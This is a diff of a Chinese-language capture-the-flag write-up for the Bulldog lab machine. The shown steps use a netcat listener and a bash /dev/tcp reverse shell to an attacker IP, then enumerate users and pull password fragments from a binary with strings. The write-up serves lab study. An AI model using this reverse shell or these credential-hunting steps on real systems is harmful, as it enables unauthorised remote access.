@@ -12,8 +12,10 @@ We'll remove these in prod. It's not like a hacker can do anything with a hash
 攻擊機:`nc -l 3333`  
 靶機shell欄位:`echo "bash -i >& /dev/tcp/10.10.10.10/3333 0>&1" | bash`  
 查看可疑user，發現bulldogadmin和django，查看bulldogadmin文件，發現可疑目錄/home/bulldogadmin/.hiddenadmindirectory
-從note中發現提示  
-> Literally run the app, give your account password >
+從note中發現提示
+
+> Literally run the app, give your account password
+
 用strings查看customPermissionApp，發現奇怪字眼  
 `SUPERultH
 imatePASH
